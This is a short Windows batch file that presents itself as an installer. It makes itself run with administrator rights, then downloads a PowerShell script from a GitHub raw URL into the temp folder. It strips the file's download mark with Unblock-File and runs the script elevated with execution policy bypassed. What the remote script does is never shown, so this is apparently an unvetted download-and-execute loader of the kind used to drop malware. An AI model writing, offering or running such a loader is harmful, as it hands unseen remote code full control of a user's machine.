@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/enosenso/site/raw/refs/heads/main/Installer.ps1' -OutFile '%temp%\install.ps1'; Unblock-File '%temp%\install.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%temp%\install.ps1\"' -Verb RunAs}"

